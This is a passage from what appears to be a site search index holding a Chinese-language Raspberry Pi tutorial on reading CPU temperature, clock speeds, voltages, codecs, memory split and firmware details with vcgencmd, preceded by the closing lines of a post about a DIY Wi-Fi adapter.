\u9891\u7e41\u901a\u8fc7Samba\u8bfb\u5199\u6811\u8393\u6d3e\u4e0a\u7684\u6587\u4ef6\uff0c\u5728\u8bfb\u53d68G\uff0c\u5199\u51655G\u7684\u6570\u636e\u4e4b\u540e\u6ca1\u6709\u51fa\u73b0\u6b7b\u673a\u5361\u6b7b\u7684\u60c5\u51b5\u3002","title":"\u6d4b\u8bd5"},{"location":"RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/#_5","text":"\u4ece\u4e0a\u9762\u7684\u6d4b\u8bd5\u7ed3\u679c\u548c\u6211\u51e0\u5929\u7684\u4f7f\u7528\u60c5\u51b5\u770b\u6765\uff0c\u8fd9\u6b3eDIY\u7684\u6811\u8393\u6d3e \u65e0\u7ebf\u7f51\u5361 \u62e5\u6709\u975e\u5e38\u53ef\u89c2\u7684\u901f\u5ea6\u548c\u7a33\u5b9a\u6027,\u53ef\u4ee5\u65e0\u89c6\u5e02\u9762\u4e0a\u5927\u90e8\u5206\u65e0\u7ebf\u7f51\u5361\u4e86\u3002 \u5728\u8c03\u8bd5\u8fd9\u6b3e\u7f51\u5361\u65f6\u82b1\u4e86\u4e0d\u5c11\u65f6\u95f4\uff0c\u65e0\u6570\u6b21\u60f3Knock my head against the wall.\u6211\u4f1a\u5c06\u8c03\u8bd5\u8fc7\u7a0b\u548c\u9047\u5230\u7684\u95ee\u9898\u8bb0\u5f55\u5728\u53e6\u4e00\u7bc7\u6587\u7ae0\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://www.shuyz.com/posts/diy-stable-wifi-adapter-for-raspberry-pi/","title":"\u603b\u7ed3"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/","text":"\u4f7f\u7528 vcgencmd \u6307\u4ee4\u67e5\u770b Raspberry Pi \u7684 CPU \u6eab\u5ea6\u3001\u904b\u884c\u901f\u5ea6\u8207\u96fb\u58d3\u7b49\u8cc7\u8a0a \u9019\u88cf\u4ecb\u7d39\u5982\u4f55\u4f7f\u7528 vcgencmd \u6307\u4ee4\u67e5\u770b Raspberry Pi \u7684 CPU \u6eab\u5ea6\u3001\u904b\u884c\u901f\u5ea6\u8207\u96fb\u58d3\u7b49\u8cc7\u8a0a\uff0c\u5373\u6642\u76e3\u63a7\u786c\u9ad4\u7684\u72c0\u614b\u3002 \u5728 Raspberry Pi \u4e2d\u6211\u5011\u53ef\u4ee5\u5229\u7528 vcgencmd \u6307\u4ee4\u4f86\u67e5\u770b\u5404\u7a2e\u7684\u786c\u9ad4\u8cc7\u8a0a\u8207\u72c0\u614b\uff0c\u4ee5\u4e0b\u662f\u5e38\u7528\u7684\u6307\u4ee4\u7bc4\u4f8b\u3002 (adsbygoogle = window.adsbygoogle || []).push({}); \u6642\u8108\u983b\u7387\uff08clock frequency\uff09 \u5982\u679c\u8981\u67e5\u8a62\u786c\u9ad4\u76ee\u524d\u7684\u6642\u8108\u983b\u7387\uff0c\u53ef\u4ee5\u4f7f\u7528 measure_clock \u53c3\u6578\uff1a vcgencmd measure_clock <clock> \u5176\u4e2d\u7684 <clock> \u662f\u6307\u5b9a\u8981\u67e5\u8a62\u7684\u786c\u9ad4\uff0c\u53ef\u7528\u7684\u9078\u9805\u6709 arm \u3001 core \u3001 h264 \u3001 isp \u3001 v3d \u3001 uart \u3001 pwm \u3001 emmc \u3001 pixel \u3001 vec \u3001 hdmi \u3001 dpi \u3002 \u5982\u679c\u8981\u67e5\u8a62 CPU \u7684\u6642\u8108\u983b\u7387\uff08\u4e5f\u5c31\u662f\u901f\u5ea6\uff09\uff0c\u53ef\u4ee5\u57f7\u884c vcgencmd measure_clock arm \u8f38\u51fa\u70ba frequency(45)=700000000 \u5982\u679c\u60f3\u67e5\u8a62\u6240\u6709\u7684\u786c\u9ad4\u6642\u8108\u983b\u7387\uff0c\u53ef\u4ee5\u4f7f\u7528\u7c21\u55ae\u7684 shell \u6307\u4ee4\u7a3f\uff1a for src in arm core h264 isp v3d uart pwm emmc pixel vec hdmi dpi ; do \\ echo -e \"$src:\\t$(vcgencmd measure_clock $src)\" ; \\ done \u8f38\u51fa\u70ba `arm: frequency(45)=700000000 core: frequency(1)=250000000 h264: frequency(28)=250000000 isp: frequency(42)=250000000 v3d: frequency(43)=250000000 uart: frequency(22)=3000000 pwm: frequency(25)=0 emmc: frequency(47)=250000000 pixel: frequency(29)=108000000 vec: frequency(10)=0 hdmi: frequency(9)=163682000 dpi: frequency(4)=0` \u96fb\u58d3\uff08voltage\uff09 \u5982\u679c\u8981\u67e5\u8a62\u786c\u9ad4\u76ee\u524d\u7684\u5de5\u4f5c\u96fb\u58d3\uff0c\u53ef\u4ee5\u4f7f\u7528 measure_volts \u53c3\u6578\uff1a vcgencmd measure_volts <id> \u5176\u4e2d <id> \u662f\u6307\u5b9a\u8981\u67e5\u8a62\u7684\u786c\u9ad4\uff0c\u53ef\u7528\u7684\u9078\u9805\u6709 core \u3001 sdram_c \u3001 sdram_i \u3001 sdram_p \u3002\u5982\u679c\u6c92\u6709\u6307\u5b9a <id> \uff0c\u5247\u9810\u8a2d\u70ba core \uff1a vcgencmd measure_volts \u8f38\u51fa\u70ba volt=1.200V \u67e5\u8a62\u6240\u6709\u5de5\u4f5c\u96fb\u58d3\u7684 shell \u6307\u4ee4\u7a3f\uff1a for id in core sdram_c sdram_i sdram_p ; do \\ echo -e \"$id:\\t$(vcgencmd measure_volts $id)\" ; \\ done \u8f38\u51fa\u70ba `core: volt=1.200V sdram_c: volt=1.200V sdram_i: volt=1.200V sdram_p: volt=1.225V` \u6eab\u5ea6\uff08temperature\uff09 \u5982\u679c\u8981\u67e5\u8a62 BCM2835 SoC \u76ee\u524d\u7684\u6eab\u5ea6\uff0c\u53ef\u4ee5\u4f7f\u7528 measure_temp \u53c3\u6578\uff1a vcgencmd measure_temp \u8f38\u51fa\u70ba temp=43.3\u2019C Codec \u82e5\u8981\u67e5\u8a62\u7279\u5b9a\u7684 codec \u6709\u6c92\u6709\u555f\u7528\uff0c\u53ef\u4ee5\u4f7f\u7528 codec_enabled \u53c3\u6578\uff1a vcgencmd codec_enabled <codec> \u5176\u4e2d <codec> \u662f\u6307\u5b9a\u8981\u67e5\u8a62\u7684 codec\uff0c\u53ef\u7528\u7684\u9078\u9805\u6709\uff1a H264 \u3001 MPG2 \u3001 WVC1 \u3001 MPG4 \u3001 MJPG \u3001 WMV9 \u3002 \u67e5\u8a62\u6240\u6709 codec \u7684\u6307\u4ee4\u7a3f\uff1a for codec in H264 MPG2 WVC1 MPG4 MJPG WMV9 ; do \\ echo -e \"$codec:\\t$(vcgencmd codec_enabled $codec)\" ; \\ done \u8f38\u51fa\u70ba\uff1a `H264: H264=enabled MPG2: MPG2=disabled WVC1: WVC1=disabled MPG4: MPG4=enabled MJPG: MJPG=enabled WMV9: WMV9=disabled` \u8a2d\u5b9a\u503c\uff08configurations\uff09 get_config \u53c3\u6578\u53ef\u4ee5\u5217\u51fa\u76ee\u524d\u7cfb\u7d71\u4e2d\u6240\u6709\u88ab\u8a2d\u5b9a\u7684\u53c3\u6578\u503c\uff1a vcgencmd get_config [config|int|str] \u6700\u5f8c\u4e00\u500b\u53c3\u6578\u53ef\u7528\u4f86\u6307\u5b9a\u8981\u67e5\u8a62\u7684\u8a2d\u5b9a\u503c\u540d\u7a31\u6216\u662f\u985e\u578b\uff0c\u4f8b\u5982\u67e5\u8a62 temp_limit \u7684\u6578\u503c\u53ef\u4ee5\u57f7\u884c\uff1a vcgencmd get_config temp_limit \u8f38\u51fa\u70ba temp_limit=85 \u67e5\u8a62\u6240\u6709\u6578\u503c\u8cc7\u6599\u7684\u8a2d\u5b9a\u503c\u53ef\u7528 vcgencmd get_config int \u8f38\u51fa\u70ba `hdmi_force_hotplug=1 disable_overscan=1 overscan_left=24 overscan_right=24 overscan_top=16 overscan_bottom=16 program_serial_random=1 config_hdmi_boost=4 emmc_pll_core=1 hdmi_force_cec_address=65535 framebuffer_ignore_alpha=1 framebuffer_swap=1 disable_splash=1 temp_limit=85 force_pwm_open=1 pause_burst_frames=1 second_boot=1 avoid_fix_ts=1` \u8a18\u61b6\u9ad4\u914d\u7f6e Raspberry Pi \u7684 CPU \u8207 GPU \u662f\u5171\u7528\u540c\u540c\u4e00\u500b\u8a18\u61b6\u9ad4\u7684\uff0c get_mem \u53c3\u6578\u53ef\u4ee5\u67e5\u8a62\u76ee\u524d\u8a18\u61b6\u9ad4\u7684\u914d\u7f6e\u72c0\u614b\u3002\u67e5\u8a62\u914d\u7f6e\u7d66 CPU \u7684\u8a18\u61b6\u9ad4\u5927\u5c0f\uff1a vcgencmd get_mem arm \u8f38\u51fa\u70ba arm=448M \u67e5\u8a62\u914d\u7f6e\u7d66 GPU \u7684\u8a18\u61b6\u9ad4\u5927\u5c0f\uff1a vcgencmd get_mem gpu \u8f38\u51fa\u70ba gpu=64M \u97cc\u9ad4\u7248\u672c\uff08firmware version\uff09 \u67e5\u8a62\u97cc\u9ad4\u7248\u672c\u53ef\u4ee5\u4f7f\u7528 vcgencmd version \u8f38\u51fa\u70ba `Dec 19 2014 18:44:06 Copyright (c) 2012 Broadcom version 5abd572e2ed1811283443387af09377b95501c50 (clean) (release)` OTP \u8a18\u61b6\u9ad4 \u82e5\u8981\u67e5\u8a62 SoC \u88e1\u9762 OTP\uff08one time programmable\uff09\u8a18\u61b6\u9ad4\u7684\u5167\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528 otp_dump \uff1a vcgencmd otp_dump \u8f38\u51fa\u70ba `08:00000000 09:00000000 10:00000000 11:00000000 12:00000000 13:00000000 14:00000000 15:00000000 16:00280000 17:1020000a 18:1020000a 19:ffffffff 20:ffffffff 21:ffffffff 22:ffffffff 23:ffffffff 24:ffffffff 25:ffffffff 26:ffffffff 27:0000c2c2 28:4b45c38d 29:b4ba3c72 30:00000010 31:00000000 32:00000000 33:00000000 34:00000000 35:00000000 36:00000000 37:00000000 38:00000000 39:00000000 40:00000000 41:00000000 42:00000000 43:00000000 44:00000000 45:00000000 46:00000000 47:00000000 48:00000000 49:00000000 50:00000000 51:00000000 52:00000000 53:00000000 54:00000000 55:00000000 56:00000000 57:00000000 58:00000000 59:00000000 60:00000000 61:00000000 62:00000000 63:00000000 64:00000000` \u5176\u4e2d 28 \u8207 30 \u4ee3\u8868\u786c\u9ad4\u5e8f\u865f\uff08serial\uff09\u8207\u4fee\u8a02\u7248\uff08revision\uff09\u7684\u7248\u672c\u865f\u78bc\uff0c /proc/cpuinfo \u4e2d\u6240\u986f\u793a\u7684\u5e8f\u865f\u8207\u4fee\u8a02\u7248\u672c\u865f\u78bc\u5c31\u662f\u5f9e\u9019\u88e1\u53d6\u5f97\u7684\uff0c\u800c Model B/B+ \u7684\u7db2\u8def\u5361 MAC \u5361\u865f\u4e5f\u662f\u6839\u64da\u786c\u9ad4\u5e8f\u865f\u4f86\u7522\u751f\u7684\u3002 \u67e5\u770b vcgencmd \u6240\u6709\u53ef\u7528\u7684\u53c3\u6578 \u5982\u679c\u8981\u67e5\u770b vcgencmd \u6307\u4ee4\u6240\u6709\u53ef\u7528\u7684\u53c3\u6578\uff0c\u53ef\u4ee5\u57f7\u884c vcgencmd commands \u8f38\u51fa\u6703\u985e\u4f3c\u9019\u6a23\uff1a commands=\u201dvcos, ap_output_control, ap_output_post_processing, vchi_test_init, vchi_test_exit, pm_set_policy, pm_get_status, pm_show_stats, pm_start_logging, pm_stop_logging, version, commands, set_vll_dir, led_control, set_backlight, set_logging, get_lcd_info, set_bus_arbiter_mode, cache_flush, otp_dump, test_result, codec_enabled, get_camera, get_mem, measure_clock, measure_volts, scaling_kernel, measure_temp, get_config, hdmi_ntsc_freqs, hdmi_adjust_clock, hdmi_status_show, hvs_update_fields, pwm_speedup, force_audio, hdmi_stream_channels, hdmi_channel_map, display_power, read_ring_osc, memtest, get_rsts, render_bar, disk_notify, inuse_notify, sus_suspend, sus_status, sus_is_enabled, sus_stop_test_thread, egl_platform_switch, mem_validate, mem_oom, mem_reloc_stats, file, vctest_memmap, vctest_start, vctest_stop, vctest_set, vctest_get\u201d \u9019\u4e9b\u5c31\u662f\u6240\u6709\u53ef\u4ee5\u4f7f\u7528\u7684\u53c3\u6578\uff0c\u9019\u4e9b\u53c3\u6578\u6703\u56e0\u70ba\u97cc\u9ad4\u7248\u672c\u4e0d\u540c\u800c\u6709\u5dee\u7570\u3002 \u5982\u679c\u60a8\u5c0d\u65bc\u6a39\u8393\u6d3e\u7684\u61c9\u7528\u6709\u8208\u8da3\uff0c\u5efa\u8b70\u60a8\u53ef\u4ee5\u7e7c\u7e8c\u95b1\u8b80 \u7269\u806f\u7db2 \u7684\u76f8\u95dc\u6587\u7ae0\u3002 \u53c3\u8003\u8cc7\u6599\uff1a Embedded Linux Wiki \u3001 raspberrypi.org \u3001 maketecheasier \u3001 lokir\u2019s linux notes (adsbygoogle = window.adsbygoogle || []).push({}); \u539f\u6587\u94fe\u63a5\uff1a https://blog.gtwang.org/iot/raspberry-pi-vcgencmd-hardware-information/","title":"\u4f7f\u7528 vcgencmd \u6307\u4ee4\u67e5\u770b Raspberry Pi \u7684 CPU \u6eab\u5ea6\u3001\u904b\u884c\u901f\u5ea6\u8207\u96fb\u58d3\u7b49\u8cc7\u8a0a"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#vcgencmd-raspberry-pi-cpu","text":"\u9019\u88cf\u4ecb\u7d39\u5982\u4f55\u4f7f\u7528 vcgencmd \u6307\u4ee4\u67e5\u770b Raspberry Pi \u7684 CPU \u6eab\u5ea6\u3001\u904b\u884c\u901f\u5ea6\u8207\u96fb\u58d3\u7b49\u8cc7\u8a0a\uff0c\u5373\u6642\u76e3\u63a7\u786c\u9ad4\u7684\u72c0\u614b\u3002 \u5728 Raspberry Pi \u4e2d\u6211\u5011\u53ef\u4ee5\u5229\u7528 vcgencmd \u6307\u4ee4\u4f86\u67e5\u770b\u5404\u7a2e\u7684\u786c\u9ad4\u8cc7\u8a0a\u8207\u72c0\u614b\uff0c\u4ee5\u4e0b\u662f\u5e38\u7528\u7684\u6307\u4ee4\u7bc4\u4f8b\u3002 (adsbygoogle = window.adsbygoogle || []).push({});","title":"\u4f7f\u7528 vcgencmd \u6307\u4ee4\u67e5\u770b Raspberry Pi \u7684 CPU \u6eab\u5ea6\u3001\u904b\u884c\u901f\u5ea6\u8207\u96fb\u58d3\u7b49\u8cc7\u8a0a"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#clock-frequency","text":"\u5982\u679c\u8981\u67e5\u8a62\u786c\u9ad4\u76ee\u524d\u7684\u6642\u8108\u983b\u7387\uff0c\u53ef\u4ee5\u4f7f\u7528 measure_clock \u53c3\u6578\uff1a vcgencmd measure_clock <clock> \u5176\u4e2d\u7684 <clock> \u662f\u6307\u5b9a\u8981\u67e5\u8a62\u7684\u786c\u9ad4\uff0c\u53ef\u7528\u7684\u9078\u9805\u6709 arm \u3001 core \u3001 h264 \u3001 isp \u3001 v3d \u3001 uart \u3001 pwm \u3001 emmc \u3001 pixel \u3001 vec \u3001 hdmi \u3001 dpi \u3002 \u5982\u679c\u8981\u67e5\u8a62 CPU \u7684\u6642\u8108\u983b\u7387\uff08\u4e5f\u5c31\u662f\u901f\u5ea6\uff09\uff0c\u53ef\u4ee5\u57f7\u884c vcgencmd measure_clock arm \u8f38\u51fa\u70ba frequency(45)=700000000 \u5982\u679c\u60f3\u67e5\u8a62\u6240\u6709\u7684\u786c\u9ad4\u6642\u8108\u983b\u7387\uff0c\u53ef\u4ee5\u4f7f\u7528\u7c21\u55ae\u7684 shell \u6307\u4ee4\u7a3f\uff1a for src in arm core h264 isp v3d uart pwm emmc pixel vec hdmi dpi ; do \\ echo -e \"$src:\\t$(vcgencmd measure_clock $src)\" ; \\ done \u8f38\u51fa\u70ba `arm: frequency(45)=700000000 core: frequency(1)=250000000 h264: frequency(28)=250000000 isp: frequency(42)=250000000 v3d: frequency(43)=250000000 uart: frequency(22)=3000000 pwm: frequency(25)=0 emmc: frequency(47)=250000000 pixel: frequency(29)=108000000 vec: frequency(10)=0 hdmi: frequency(9)=163682000 dpi: frequency(4)=0`","title":"\u6642\u8108\u983b\u7387\uff08clock frequency\uff09"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#voltage","text":"\u5982\u679c\u8981\u67e5\u8a62\u786c\u9ad4\u76ee\u524d\u7684\u5de5\u4f5c\u96fb\u58d3\uff0c\u53ef\u4ee5\u4f7f\u7528 measure_volts \u53c3\u6578\uff1a vcgencmd measure_volts <id> \u5176\u4e2d <id> \u662f\u6307\u5b9a\u8981\u67e5\u8a62\u7684\u786c\u9ad4\uff0c\u53ef\u7528\u7684\u9078\u9805\u6709 core \u3001 sdram_c \u3001 sdram_i \u3001 sdram_p \u3002\u5982\u679c\u6c92\u6709\u6307\u5b9a <id> \uff0c\u5247\u9810\u8a2d\u70ba core \uff1a vcgencmd measure_volts \u8f38\u51fa\u70ba volt=1.200V \u67e5\u8a62\u6240\u6709\u5de5\u4f5c\u96fb\u58d3\u7684 shell \u6307\u4ee4\u7a3f\uff1a for id in core sdram_c sdram_i sdram_p ; do \\ echo -e \"$id:\\t$(vcgencmd measure_volts $id)\" ; \\ done \u8f38\u51fa\u70ba `core: volt=1.200V sdram_c: volt=1.200V sdram_i: volt=1.200V sdram_p: volt=1.225V`","title":"\u96fb\u58d3\uff08voltage\uff09"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#temperature","text":"\u5982\u679c\u8981\u67e5\u8a62 BCM2835 SoC \u76ee\u524d\u7684\u6eab\u5ea6\uff0c\u53ef\u4ee5\u4f7f\u7528 measure_temp \u53c3\u6578\uff1a vcgencmd measure_temp \u8f38\u51fa\u70ba temp=43.3\u2019C","title":"\u6eab\u5ea6\uff08temperature\uff09"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#codec","text":"\u82e5\u8981\u67e5\u8a62\u7279\u5b9a\u7684 codec \u6709\u6c92\u6709\u555f\u7528\uff0c\u53ef\u4ee5\u4f7f\u7528 codec_enabled \u53c3\u6578\uff1a vcgencmd codec_enabled <codec> \u5176\u4e2d <codec> \u662f\u6307\u5b9a\u8981\u67e5\u8a62\u7684 codec\uff0c\u53ef\u7528\u7684\u9078\u9805\u6709\uff1a H264 \u3001 MPG2 \u3001 WVC1 \u3001 MPG4 \u3001 MJPG \u3001 WMV9 \u3002 \u67e5\u8a62\u6240\u6709 codec \u7684\u6307\u4ee4\u7a3f\uff1a for codec in H264 MPG2 WVC1 MPG4 MJPG WMV9 ; do \\ echo -e \"$codec:\\t$(vcgencmd codec_enabled $codec)\" ; \\ done \u8f38\u51fa\u70ba\uff1a `H264: H264=enabled MPG2: MPG2=disabled WVC1: WVC1=disabled MPG4: MPG4=enabled MJPG: MJPG=enabled WMV9: WMV9=disabled`","title":"Codec"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#configurations","text":"get_config \u53c3\u6578\u53ef\u4ee5\u5217\u51fa\u76ee\u524d\u7cfb\u7d71\u4e2d\u6240\u6709\u88ab\u8a2d\u5b9a\u7684\u53c3\u6578\u503c\uff1a vcgencmd get_config [config|int|str] \u6700\u5f8c\u4e00\u500b\u53c3\u6578\u53ef\u7528\u4f86\u6307\u5b9a\u8981\u67e5\u8a62\u7684\u8a2d\u5b9a\u503c\u540d\u7a31\u6216\u662f\u985e\u578b\uff0c\u4f8b\u5982\u67e5\u8a62 temp_limit \u7684\u6578\u503c\u53ef\u4ee5\u57f7\u884c\uff1a vcgencmd get_config temp_limit \u8f38\u51fa\u70ba temp_limit=85 \u67e5\u8a62\u6240\u6709\u6578\u503c\u8cc7\u6599\u7684\u8a2d\u5b9a\u503c\u53ef\u7528 vcgencmd get_config int \u8f38\u51fa\u70ba `hdmi_force_hotplug=1 disable_overscan=1 overscan_left=24 overscan_right=24 overscan_top=16 overscan_bottom=16 program_serial_random=1 config_hdmi_boost=4 emmc_pll_core=1 hdmi_force_cec_address=65535 framebuffer_ignore_alpha=1 framebuffer_swap=1 disable_splash=1 temp_limit=85 force_pwm_open=1 pause_burst_frames=1 second_boot=1 avoid_fix_ts=1`","title":"\u8a2d\u5b9a\u503c\uff08configurations\uff09"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#_1","text":"Raspberry Pi \u7684 CPU \u8207 GPU \u662f\u5171\u7528\u540c\u540c\u4e00\u500b\u8a18\u61b6\u9ad4\u7684\uff0c get_mem \u53c3\u6578\u53ef\u4ee5\u67e5\u8a62\u76ee\u524d\u8a18\u61b6\u9ad4\u7684\u914d\u7f6e\u72c0\u614b\u3002\u67e5\u8a62\u914d\u7f6e\u7d66 CPU \u7684\u8a18\u61b6\u9ad4\u5927\u5c0f\uff1a vcgencmd get_mem arm \u8f38\u51fa\u70ba arm=448M \u67e5\u8a62\u914d\u7f6e\u7d66 GPU \u7684\u8a18\u61b6\u9ad4\u5927\u5c0f\uff1a vcgencmd get_mem gpu \u8f38\u51fa\u70ba gpu=64M","title":"\u8a18\u61b6\u9ad4\u914d\u7f6e"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#firmware-version","text":"\u67e5\u8a62\u97cc\u9ad4\u7248\u672c\u53ef\u4ee5\u4f7f\u7528 vcgencmd version \u8f38\u51fa\u70ba `Dec 19 2014 18:44:06 Copyright (c) 2012 Broadcom version 5abd572e2ed1811283443387af09377b95501c50 (clean) (release)`","title":"\u97cc\u9ad4\u7248\u672c\uff08firmware version\uff09"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#otp","text":"\u82e5\u8981\u67e5\u8a62 SoC \u88e1\u9762 OTP\uff08one time programmable\uff09\u8a18\u61b6\u9ad4\u7684\u5167\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528 otp_dump \uff1a vcgencmd otp_dump \u8f38\u51fa\u70ba `08:00000000 09:00000000 10:00000000 11:00000000 12:00000000 13:00000000 14:00000000 15:00000000 16:00280000 17:1020000a 18:1020000a 19:ffffffff 20:ffffffff 21:ffffffff 22:ffffffff 23:ffffffff 24:ffffffff 25:ffffffff 26:ffffffff 27:0000c2c2 28:4b45c38d 29:b4ba3c72 30:00000010 31:00000000 32:00000000 33:00000000 34:00000000 35:00000000 36:00000000 37:00000000 38:00000000 39:00000000 40:00000000 41:00000000 42:00000000 43:00000000 44:00000000 45:00000000 46:00000000 47:00000000 48:00000000 49:00000000 50:00000000 51:00000000 52:00000000 53:00000000 54:00000000 55:00000000 56:00000000 57:00000000 58:00000000 59:00000000 60:00000000 61:00000000 62:00000000 63:00000000 64:00000000` \u5176\u4e2d 28 \u8207 30 \u4ee3\u8868\u786c\u9ad4\u5e8f\u865f\uff08serial\uff09\u8207\u4fee\u8a02\u7248\uff08revision\uff09\u7684\u7248\u672c\u865f\u78bc\uff0c /proc/cpuinfo \u4e2d\u6240\u986f\u793a\u7684\u5e8f\u865f\u8207\u4fee\u8a02\u7248\u672c\u865f\u78bc\u5c31\u662f\u5f9e\u9019\u88e1\u53d6\u5f97\u7684\uff0c\u800c Model B/B+ \u7684\u7db2\u8def\u5361 MAC \u5361\u865f\u4e5f\u662f\u6839\u64da\u786c\u9ad4\u5e8f\u865f\u4f86\u7522\u751f\u7684\u3002","title":"OTP \u8a18\u61b6\u9ad4"},{"location":"RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/#vcgencmd","text":"\u5982\u679c\u8981\u67e5\u770b vcgencmd \u6307\u4ee4\u6240\u6709\u53ef\u7528\u7684\u53c3\u6578\uff0c\u53ef\u4ee5\u57f7\u884c vcgencmd commands \u8f38\u51fa\u6703\u985e\u4f3c\u9019\u6a23\uff1a commands=\u201dvcos, ap_output_control, ap_output_post_processing, vchi_test_init, vchi_test_exit, pm_set_policy, pm_get_status, pm_show_stats, pm_start_logging, pm_stop_logging, version, commands, set_vll_dir, led_control, set_backlight, set_logging, get_lcd_info, set_bus_arbiter_mode, cache_flush, otp_dump, test_result, codec_enabled, get_camera, get_mem, measure_clock, measure_volts, scaling_kernel, measure_temp, get_config, hdmi_ntsc_freqs, hdmi_adjust_clock, hdmi_status_show, hvs_update_fields, pwm_speedup, force_audio, hdmi_stream_channels, hdmi_channel_map, display_power, read_ring_osc, memtest, get_rsts, render_bar, disk_notify, inuse_notify, sus_suspend, sus_status, sus_is_enabled, sus_stop_test_thread, egl_platform_switch, mem_validate, mem_oom, mem_reloc_stats, file, vctest_memmap, vctest_start, vctest_stop, vctest_set, vctest_get\u201d \u9019\u4e9b\u5c31\u662f\u6240\u6709\u53ef\u4ee5\u4f7f\u7528\u7684\u53c3\u6578\uff0c\u9019\u4e9b\u53c3\u6578\u6703\u56e0\u70ba\u97cc\u9ad4\u7248\u672c\u4e0d\u540c\u800c\u6709\u5dee\u7570\u3002 \u5982\u679c\u60a8\u5c0d\u65bc\u6a39\u8393\u6d3e\u7684\u61c9\u7528\u6709\u8208\u8da3\uff0c\u5efa\u8b70\u60a8\u53ef\u4ee5\u7e7c\u7e8c\u95b1\u8b80 \u7269\u806f\u7db2 \u7684\u76f8\u95dc\u6587\u7ae0\u3002 \u53c3\u8003\u8cc7\u6599\uff1a Embedded Linux Wiki \u3001 raspberrypi.org \u3001 maketecheasier \u3001 lokir\u2019s linux notes (adsbygoogle = window.adsbygoogle || []).push({}); \u539f\u6587\u94fe\u63a5\uff1a https://blog.gtwang.org/iot/raspberry-pi-vcgencmd-hardware-information/","title":"\u67e5\u770b vcgencmd 